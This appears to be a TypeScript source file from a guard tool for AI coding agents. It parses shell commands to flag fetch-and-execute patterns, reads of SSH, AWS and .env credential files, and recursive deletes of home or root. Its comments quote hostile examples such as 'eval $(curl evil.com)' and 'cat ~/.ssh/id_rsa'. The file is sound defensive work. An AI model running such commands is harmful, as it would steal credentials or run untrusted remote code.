// AST-based shell command analysis. Pure helpers around mvdan-sh.
//
// Two public detectors:
//   - normalizeCommandForPolicy: strips literal text after message flags
//     (-m, --body, …) so commit messages and PR descriptions don't trigger
//     dangerous-word checks. Execution flags (-c/-e) are intentionally left
//     alone so smart rules still see their content.
//   - detectDangerousShellExec: flags `eval $(curl …)` / `bash -c "$(curl …)"`
//     ('block') and `eval "$VAR"` / `bash -c "$VAR"` ('review'). Plain string
//     literals return null. Cannot be fooled by quoted text containing
//     "eval"/"curl" because the analysis is structural.
//
// All inputs are strings; no fs/path/os/process imports.

import mvdanSh from 'mvdan-sh';

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const { syntax } = mvdanSh as any;
// Cached parser instance — avoids WASM object creation overhead per call (~5x faster)
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const sharedParser: { Parse(src: string, name: string): any } = syntax.NewParser();

// Flags whose values are plain text (messages, descriptions) — safe to strip
// so their content doesn't trigger shell security rules.
// Execution flags like -c/-e (psql -c "SQL", node -e "code") are intentionally
// excluded so their content IS still checked by smart rules.
const MESSAGE_FLAGS = new Set([
  '-m',
  '--message',
  '--body',
  '--title',
  '--description',
  '--comment',
  '--subject',
  '--summary',
]);

// Shell interpreters that accept a -c flag for inline command execution
const SHELL_INTERPRETERS = new Set(['bash', 'sh', 'zsh', 'fish', 'dash', 'ksh']);
// Remote download tools whose presence in a CmdSubst is high-confidence malicious
const DOWNLOAD_CMDS = new Set(['curl', 'wget']);

/**
 * True when a node is either a plain Lit, or a CmdSubst whose only command is
 * `cat` reading from a heredoc — i.e. content the user intends as text, not as
 * a shell side-effect. Used to strip multi-line commit messages of the form
 * `git commit -m "$(cat <<'EOF' … EOF)"` so words like "force"/"reset"/"sudo"
 * inside the message body don't trigger smart rules.
 */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function isCatHeredocOrLit(part: any): boolean {
  if (!part) return false;
  const t = syntax.NodeType(part);
  if (t === 'Lit') return true;
  if (t !== 'CmdSubst') return false;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const stmts: any[] = part.Stmts || [];
  if (stmts.length !== 1) return false;
  const stmt = stmts[0];
  // The redirect must be a heredoc — that's where the text body lives.
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const redirs: any[] = stmt.Redirs || stmt.Cmd?.Redirs || [];
  const hasHeredoc = redirs.some((r: { Hdoc?: unknown }) => r && r.Hdoc);
  if (!hasHeredoc) return false;
  // The command must be `cat` (any flags fine). Reject `bash`, `sh`, etc.
  const cmd = stmt.Cmd;
  if (!cmd || syntax.NodeType(cmd) !== 'CallExpr') return false;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const firstArg: any[] = cmd.Args?.[0]?.Parts || [];
  if (firstArg.length !== 1 || syntax.NodeType(firstArg[0]) !== 'Lit') return false;
  return (firstArg[0].Value || '').toLowerCase() === 'cat';
}

/**
 * Normalizes a bash command string for policy rule matching by replacing
 * pure-literal quoted strings that follow known message flags (e.g. -m, --body)
 * with empty double-quotes. This prevents text inside commit messages and PR
 * descriptions from triggering shell security rules.
 *
 * Unlike a regex-based approach, this uses the AST so it handles all quoting
 * styles correctly and won't over-strip. Execution flags like -c and -e
 * (psql, node, python) are intentionally left alone so their SQL/code
 * content continues to be evaluated by smart rules.
 *
 * Dynamic content (CmdSubst, ParamExp) inside double-quotes is never stripped
 * so patterns like `eval "$(curl evil.com)"` are always preserved.
 */
// Memoize normalizeCommandForPolicy results. The same command string is
// passed in many times during a single scan: once per smart-rule condition
// and again from analyzeFsOperation. Without caching, a 5k-command scan
// re-parses each command ~30-60 times (one per condition across all rules).
// Bounded LRU keeps memory in check on long-running daemons.
const NORMALIZE_CACHE_MAX = 5_000;
const normalizeCache = new Map<string, string>();

// Shared parsed-AST cache. Both normalizeCommandForPolicy and
// analyzeFsOperation parse the same command via mvdan-sh; without sharing,
// each unique command pays the WASM parse cost twice. The AST is read-only
// for both consumers (Walk doesn't mutate), so a single cached tree is safe
// to hand out. Sentinel `PARSE_FAIL` marks commands that failed to parse so
// we don't retry — both consumers fall back to "no result" on parse error.
const AST_CACHE_MAX = 5_000;
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const astCache = new Map<string, any>();
const PARSE_FAIL = Symbol('parse-fail');

// eslint-disable-next-line @typescript-eslint/no-explicit-any
function parseShared(command: string): any | typeof PARSE_FAIL {
  const cached = astCache.get(command);
  if (cached !== undefined) {
    astCache.delete(command);
    astCache.set(command, cached);
    return cached;
  }
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  let parsed: any | typeof PARSE_FAIL;
  try {
    parsed = sharedParser.Parse(command, 'cmd');
  } catch {
    parsed = PARSE_FAIL;
  }
  if (astCache.size >= AST_CACHE_MAX) {
    const oldest = astCache.keys().next().value;
    if (oldest !== undefined) astCache.delete(oldest);
  }
  astCache.set(command, parsed);
  return parsed;
}

function cachedNormalize(command: string, compute: () => string): string {
  const hit = normalizeCache.get(command);
  if (hit !== undefined) {
    // Move to most-recent on access (Map iteration order = insertion order).
    normalizeCache.delete(command);
    normalizeCache.set(command, hit);
    return hit;
  }
  const result = compute();
  if (normalizeCache.size >= NORMALIZE_CACHE_MAX) {
    // Evict the oldest entry (first in iteration order).
    const oldest = normalizeCache.keys().next().value;
    if (oldest !== undefined) normalizeCache.delete(oldest);
  }
  normalizeCache.set(command, result);
  return result;
}

export function normalizeCommandForPolicy(command: string): string {
  return cachedNormalize(command, () => normalizeCommandForPolicyImpl(command));
}

function normalizeCommandForPolicyImpl(command: string): string {
  const f = parseShared(command);
  if (f === PARSE_FAIL) return command; // fail open for FPs, not FNs
  try {
    const strips: Array<[number, number]> = [];

    syntax.Walk(f, (node: unknown) => {
      if (!node) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (syntax.NodeType(n) !== 'CallExpr') return true;

      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const args: any[] = n.Args || [];
      for (let i = 0; i < args.length - 1; i++) {
        // Check if this arg is a known message flag (single Lit word starting with -)
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const argParts: any[] = args[i].Parts || [];
        if (argParts.length !== 1 || syntax.NodeType(argParts[0]) !== 'Lit') continue;
        const flagVal: string = argParts[0].Value || '';
        if (!MESSAGE_FLAGS.has(flagVal.toLowerCase())) continue;

        // The next arg (a Word) — strip it if its single Part is a pure-literal quoted string.
        // args[i+1] is always a Word node; the quote type lives in Parts[0].
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const next = args[i + 1] as any;
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const nextParts: any[] = next.Parts || [];
        if (nextParts.length !== 1) continue;
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const quotedNode = nextParts[0] as any;
        const nt: string = syntax.NodeType(quotedNode);
        if (nt === 'SglQuoted') {
          strips.push([next.Pos().Offset(), next.End().Offset()]);
        } else if (nt === 'DblQuoted') {
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const innerParts: any[] = quotedNode.Parts || [];
          const allLit =
            innerParts.length === 0 ||
            innerParts.every((p: unknown) => syntax.NodeType(p) === 'Lit');
          if (allLit) {
            strips.push([next.Pos().Offset(), next.End().Offset()]);
          } else if (innerParts.every((p: unknown) => isCatHeredocOrLit(p))) {
            // Pattern: -m "$(cat <<'EOF' … EOF)" — common for multi-line
            // commit messages. The heredoc body is a literal that the agent
            // intends as message text, so stripping it matches user intent.
            // Only strip when every dynamic part is a cat-heredoc (no $(date),
            // no $VAR mixed in) to avoid stripping intentional dynamic values.
            strips.push([next.Pos().Offset(), next.End().Offset()]);
          }
        }
      }
      return true;
    });

    if (strips.length === 0) return command;
    strips.sort((a, b) => b[0] - a[0]); // end→start so earlier offsets stay valid
    let result = command;
    for (const [start, end] of strips) {
      result = result.slice(0, start) + '""' + result.slice(end);
    }
    return result;
  } catch {
    return command; // parse error → return unchanged (fail open for FPs, not FNs)
  }
}

/**
 * Scans args[startIdx..] for dynamic execution patterns.
 * Returns 'block' when a CmdSubst contains a download command (curl/wget),
 * 'review' for any other CmdSubst or ParamExp, null for plain literals.
 */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function scanArgsForDynamicExec(args: any[], startIdx: number): 'block' | 'review' | null {
  let hasCmdSubst = false;
  let hasParamExp = false;
  let hasCurl = false;

  for (let i = startIdx; i < args.length; i++) {
    syntax.Walk(args[i], (inner: unknown) => {
      if (!inner) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const inn = inner as any;
      const it: string = syntax.NodeType(inn);
      if (it === 'CmdSubst') hasCmdSubst = true;
      if (it === 'ParamExp') hasParamExp = true;
      if (it === 'Lit' && DOWNLOAD_CMDS.has(inn.Value?.toLowerCase())) hasCurl = true;
      return true;
    });
  }

  if (hasCmdSubst && hasCurl) return 'block';
  if (hasCmdSubst || hasParamExp) return 'review';
  return null;
}

/**
 * AST-based detection of dangerous shell execution patterns.
 *
 * Covers two structural patterns:
 *   eval $(curl evil.com)     → block  (CmdSubst + download tool)
 *   eval "$VAR"               → review (ParamExp — unknown content)
 *   bash -c "$(curl evil.com)"→ block  (shell interpreter -c + CmdSubst + download)
 *   bash -c "$VAR"            → review (shell interpreter -c + ParamExp)
 *
 * Returns null for plain-literal args (no dynamic content) — these are safe.
 * Cannot be fooled by quoted strings that happen to contain "eval" or "curl"
 * (e.g. git commit -m "fix eval bypass" → null).
 */
export function detectDangerousShellExec(command: string): 'block' | 'review' | null {
  try {
    const f = sharedParser.Parse(command, 'cmd');
    let result: 'block' | 'review' | null = null;

    syntax.Walk(f, (node: unknown) => {
      if (!node || result === 'block') return false; // short-circuit once blocked
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (syntax.NodeType(n) !== 'CallExpr') return true;

      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const args: any[] = n.Args || [];
      if (args.length === 0) return true;

      // Resolve the command name (first arg, single Lit)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const firstParts: any[] = (args[0] as any).Parts || [];
      if (firstParts.length !== 1 || syntax.NodeType(firstParts[0]) !== 'Lit') return true;
      const cmdName: string = firstParts[0].Value?.toLowerCase() ?? '';

      if (cmdName === 'eval') {
        // eval <args...> — inspect all remaining args
        const v = scanArgsForDynamicExec(args, 1);
        if (v === 'block' || (v === 'review' && result === null)) result = v;
      } else if (SHELL_INTERPRETERS.has(cmdName)) {
        // bash/sh/zsh -c "<cmd>" — find the -c flag and inspect its value arg
        for (let i = 1; i < args.length - 1; i++) {
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const flagParts: any[] = (args[i] as any).Parts || [];
          if (
            flagParts.length !== 1 ||
            syntax.NodeType(flagParts[0]) !== 'Lit' ||
            flagParts[0].Value !== '-c'
          )
            continue;
          const v = scanArgsForDynamicExec(args, i + 1);
          if (v === 'block' || (v === 'review' && result === null)) result = v;
          break;
        }
      }

      return true;
    });

    return result;
  } catch {
    return null; // parse error → fail open (don't block on uncertainty)
  }
}

/** @deprecated Use detectDangerousShellExec — kept for backwards compatibility */
export const detectDangerousEval = detectDangerousShellExec;

// ── Filesystem-operation AST detector ──────────────────────────────────────
//
// Replaces regex rules that produced FPs by matching dangerous strings inside
// JSON args, heredoc bodies, or chained-command path segments unrelated to the
// actual operation. The detector walks the AST, finds rm/cat/read-tool calls,
// and resolves *each call's* target paths against:
//   - sensitive credential prefixes (~/.ssh, ~/.aws, .env, ~/.netrc, …)
//   - $HOME root (with allow-list for tool-managed cache paths)
// returning a structured verdict per call.

const FS_READ_TOOLS = new Set([
  'cat',
  'less',
  'head',
  'tail',
  'bat',
  'more',
  'open',
  'print',
  'nano',
  'vim',
  'vi',
  'emacs',
  'code',
  'type',
]);

// Fast-path screen: the AST detector only fires when one of these tools is
// the *command name of a CallExpr* — i.e. it appears at start-of-command
// position. mvdan-sh produces a CallExpr only when the token sits at:
//   start-of-string, after pipe/and/or/semicolon/ampersand/newline, or
//   immediately inside `$(`, backticks, `(`, `{`.
// Anchoring the regex to those positions stops 99%+ of "matches inside an
// argument string / hyphenated token / commit message" wasted parses
// (e.g. `git log | head -20` still matches; `npm run type-check` no longer
// passes prescreen because `type` is mid-token, never a CallExpr name).
const FS_OP_PRESCREEN_RE =
  /(?:^|[\s|;&(`\n])(?:rm|cat|less|head|tail|bat|more|open|print|nano|vim|vi|emacs|code|type)\b/;

// Cache directories under $HOME that are tool-managed. Deleting them is safe
// (the tool re-populates), so `rm -rf` of these paths must not block.
// Conservative list — extend by user request, not by guessing.
const HOME_CACHE_ALLOWLIST = [
  '.cache',
  '.npm/_npx',
  '.npm/_cacache',
  '.cargo/registry',
  '.gradle/caches',
  '.gradle/.tmp',
  '.m2/repository',
  '.pnpm-store',
  '.yarn/cache',
  '.yarn/.cache',
  '.cache/pip',
  '.local/share/Trash',
  '.rustup/downloads',
];

const SENSITIVE_PATH_RULES: Array<{
  rule: string;
  reason: string;
  match: (p: string) => boolean;
  /** Per-rule verdict; defaults to 'block' when omitted. Credentials
   *  (.netrc / .npmrc / .docker / .kube / gcloud) use 'review' rather
   *  than 'block' — these config files have legitimate diagnostic
   *  read needs ("which registry am I configured for"), so we ask
   *  rather than hard-stop, matching the any-tool rule's verdict. */
  verdict?: 'block' | 'review';
}> = [
  {
    rule: 'shield:project-jail:block-read-ssh',
    reason: 'Reading SSH private keys is blocked by project-jail shield',
    match: (p) => /(^|[\\/])\.ssh[\\/]/i.test(p),
  },
  {
    rule: 'shield:project-jail:block-read-aws',
    reason: 'Reading AWS credentials is blocked by project-jail shield',
    match: (p) => /(^|[\\/])\.aws[\\/]/i.test(p),
  },
  {
    rule: 'shield:project-jail:block-read-env',
    reason: 'Reading .env files is blocked by project-jail shield',
    match: (p) => /(?:^|[\\/])\.env(?:\.local|\.production|\.staging)?$/i.test(p),
  },
  {
    rule: 'shield:project-jail:review-read-credentials',
    reason: 'Reading credential files requires approval (project-jail shield)',
    verdict: 'review',
    match: (p) =>
      /(?:credentials\.json|\.netrc|\.npmrc|\.docker[\\/]config\.json|gcloud[\\/]credentials)$/i.test(
        p
      ),
  },
];

export interface FsOpVerdict {
  ruleName: string;
  verdict: 'block' | 'review';
  reason: string;
  /** The actual path argument from the user's command — for explainability. */
  path: string;
}

// Tool names across all three supported agents that carry a shell command in
// `args.command`. Both the CLI scan (per-agent in scan.ts) and the live hook's
// AST FS-op tier need to know which calls are bash-shaped.
export const BASH_TOOL_NAMES = new Set<string>([
  'bash',
  'execute_bash',
  'run_shell_command',
  'shell',
  'exec_command',
]);

export function isBashTool(toolName: string): boolean {
  return BASH_TOOL_NAMES.has(toolName.toLowerCase());
}

// Names of regex-based smart rules whose detection is provided by
// analyzeFsOperation. When the AST detector ran on a bash command (regardless
// of whether AST returned a verdict) these regex rules must be suppressed —
// they FP on JSON args, heredocs, and chained-command segments that AST
// handles correctly. See scan.ts:1059 for the original CLI usage.
export const AST_FS_REGEX_RULES = new Set<string>([
  'block-rm-rf-home',
  'shield:project-jail:block-read-ssh',
  'shield:project-jail:block-read-aws',
  'shield:project-jail:block-read-env',
  'shield:project-jail:review-read-credentials',
]);

/**
 * True when `path` is under $HOME (~ or absolute /home/* or /root) AND not in
 * the tool-managed cache allow-list. Used to gate `rm -rf` on home paths.
 */
export function isProtectedHomePath(rawPath: string): boolean {
  // Normalize: strip leading $HOME / ~. Reject if not under home at all.
  let p = rawPath.replace(/^\$HOME[\\/]?|^\$\{HOME\}[\\/]?/, '~/');
  // Match ~, ~/, ~/anything (but not "~name" — that's a different user's home,
  // which is still sensitive).
  let underHome = false;
  if (p === '~' || p.startsWith('~/') || p.startsWith('~\\')) {
    p = p.replace(/^~[\\/]?/, '');
    underHome = true;
  } else if (/^\/home\/[^/]+/.test(p) || /^\/root(\/|$)/.test(p)) {
    // Strip /home/<user>/ or /root/ prefix to compare against the cache list.
    p = p.replace(/^\/home\/[^/]+[\\/]?|^\/root[\\/]?/, '');
    underHome = true;
  }
  if (!underHome) return false;

  // The bare home root itself is always protected.
  if (p === '' || p === '.' || p === './') return true;

  // Allow tool-managed caches.
  for (const safe of HOME_CACHE_ALLOWLIST) {
    if (p === safe || p.startsWith(safe + '/') || p.startsWith(safe + '\\')) {
      return false;
    }
  }
  return true;
}

/**
 * Extract literal-text positional arguments from a CallExpr. Skips flags
 * (anything starting with `-`) and ParamExp/CmdSubst (dynamic) parts. Returns
 * the resolved string for each arg that is purely literal text.
 */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function extractLiteralArgs(callExpr: any): { name: string; flags: string[]; paths: string[] } {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const args: any[] = callExpr.Args || [];
  if (args.length === 0) return { name: '', flags: [], paths: [] };
  const litFromWord = (w: unknown): string | null => {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const parts: any[] = (w as any)?.Parts || [];
    let s = '';
    for (const p of parts) {
      const t = syntax.NodeType(p);
      if (t === 'Lit') s += (p.Value ?? '').replace(/\\(.)/g, '$1');
      else if (t === 'SglQuoted') s += p.Value ?? '';
      else if (t === 'DblQuoted') {
        // Only accept pure-literal double-quoted (no expansion)
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const inner: any[] = p.Parts || [];
        if (!inner.every((ip: unknown) => syntax.NodeType(ip) === 'Lit')) return null;
        s += inner.map((ip: { Value?: string }) => ip.Value ?? '').join('');
      } else {
        return null; // dynamic — can't resolve safely
      }
    }
    return s;
  };
  const name = (litFromWord(args[0]) || '').toLowerCase();
  const flags: string[] = [];
  const paths: string[] = [];
  for (let i = 1; i < args.length; i++) {
    const v = litFromWord(args[i]);
    if (v === null) continue;
    if (v.startsWith('-')) flags.push(v);
    else paths.push(v);
  }
  return { name, flags, paths };
}

/**
 * AST-based filesystem-operation detector. Walks each CallExpr, identifies
 * dangerous patterns by *resolved path arguments*, returns the first verdict
 * encountered. Never matches dangerous strings that appear inside JSON args,
 * heredoc bodies, or unrelated path segments — the structural analysis means
 * a string only counts if it is the actual argument to the actual command.
 */
// Memoize analyzeFsOperation. The scanner calls this once per bash command
// and many commands repeat across sessions. Bounded LRU like the normalize
// cache. `null` results are cached too — that's the common case (no fs op).
const FS_OP_CACHE_MAX = 5_000;
const fsOpCache = new Map<string, FsOpVerdict | null>();

export function analyzeFsOperation(command: string): FsOpVerdict | null {
  // Fast path — skip the AST parse when no fs-op tool keyword is present.
  if (!FS_OP_PRESCREEN_RE.test(command)) return null;
  if (fsOpCache.has(command)) {
    const hit = fsOpCache.get(command) ?? null;
    fsOpCache.delete(command);
    fsOpCache.set(command, hit);
    return hit;
  }
  const computed = analyzeFsOperationImpl(command);
  if (fsOpCache.size >= FS_OP_CACHE_MAX) {
    const oldest = fsOpCache.keys().next().value;
    if (oldest !== undefined) fsOpCache.delete(oldest);
  }
  fsOpCache.set(command, computed);
  return computed;
}

function analyzeFsOperationImpl(command: string): FsOpVerdict | null {
  const f = parseShared(command);
  if (f === PARSE_FAIL) return null;
  let result: FsOpVerdict | null = null;
  try {
    syntax.Walk(f, (node: unknown) => {
      if (!node || result) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (syntax.NodeType(n) !== 'CallExpr') return true;
      const { name, flags, paths } = extractLiteralArgs(n);
      if (!name) return true;

      // rm with -r and -f (any combination, e.g. -rf, -fr, -r -f)
      if (name === 'rm') {
        const flagStr = flags.join('').toLowerCase();
        const hasR = /[r]/.test(flagStr) || flags.includes('--recursive');
        const hasF = /[f]/.test(flagStr) || flags.includes('--force');
        if (hasR && hasF) {
          for (const p of paths) {
            if (isProtectedHomePath(p)) {
              result = {
                ruleName: 'block-rm-rf-home',
                verdict: 'block',
                reason: 'Recursive delete of home directory is irreversible',
                path: p,
              };
              return false;
            }
            // /
            if (p === '/' || /^\/+$/.test(p)) {
              result = {
                ruleName: 'block-rm-rf-home',
                verdict: 'block',
                reason: 'Recursive delete of root is catastrophic',
                path: p,
              };
              return false;
            }
          }
        }
      }

      // Read tools — `cat ~/.ssh/id_rsa`, etc.
      if (FS_READ_TOOLS.has(name)) {
        for (const p of paths) {
          for (const sp of SENSITIVE_PATH_RULES) {
            if (sp.match(p)) {
              result = {
                ruleName: sp.rule,
                verdict: sp.verdict ?? 'block',
                reason: sp.reason,
                path: p,
              };
              return false;
            }
          }
        }
      }

      return true;
    });
    return result;
  } catch {
    return null;
  }
}

export interface ShellCommandAnalysis {
  /** First word of every CallExpr — the command names invoked. */
  actions: string[];
  /** Non-flag positional arguments — likely file paths. */
  paths: string[];
  /** Lowercased token bag, expanded to include split path segments and de-flagged variants. */
  allTokens: string[];
}

/**
 * Tokenizes a shell command into actions / paths / all-tokens for policy
 * matching. Tries the AST first; if mvdan-sh fails to parse, falls back to
 * a permissive regex tokenizer so dangerous-word checks still see something.
 */
export function analyzeShellCommand(command: string): ShellCommandAnalysis {
  const actions: string[] = [];
  const paths: string[] = [];
  const allTokens: string[] = [];

  const addToken = (token: string) => {
    const lower = token.toLowerCase();
    allTokens.push(lower);
    if (lower.includes('/')) allTokens.push(...lower.split('/').filter(Boolean));
    if (lower.startsWith('-')) allTokens.push(lower.replace(/^-+/, ''));
  };

  try {
    const f = sharedParser.Parse(command, 'cmd');
    syntax.Walk(f, (node: unknown) => {
      if (!node) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (syntax.NodeType(n) !== 'CallExpr') return true;

      // Collect literal text from each word argument (skip pure flag tokens).
      // Unescape Lit values so `r\m` is treated as `rm` (shell backslash-escaping).
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const wordValues: string[] = (n.Args || [])
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        .map((arg: any) => {
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          return (
            (arg.Parts || [])
              // eslint-disable-next-line @typescript-eslint/no-explicit-any
              .map((p: any) => (p.Value ?? '').replace(/\\(.)/g, '$1'))
              .join('')
          );
        })
        .filter((s: string) => s.length > 0);

      if (wordValues.length > 0) {
        const cmd = wordValues[0].toLowerCase();
        if (!actions.includes(cmd)) actions.push(cmd);
        wordValues.forEach((w: string) => addToken(w));
        wordValues.slice(1).forEach((w: string) => {
          if (!w.startsWith('-')) paths.push(w);
        });
      }
      return true;
    });
  } catch {
    // AST parse failed — fallback to regex tokenizer
  }

  if (allTokens.length === 0) {
    const normalized = command.replace(/\\(.)/g, '$1');
    const sanitized = normalized.replace(/["'<>]/g, ' ');
    const segments = sanitized.split(/[|;&]|\$\(|\)|`/);
    segments.forEach((segment) => {
      const tokens = segment.trim().split(/\s+/).filter(Boolean);
      if (tokens.length > 0) {
        const action = tokens[0].toLowerCase();
        if (!actions.includes(action)) actions.push(action);
        tokens.forEach((t) => {
          addToken(t);
          if (t !== tokens[0] && !t.startsWith('-')) {
            if (!paths.includes(t)) paths.push(t);
          }
        });
      }
    });
  }
  return { actions, paths, allTokens };
}
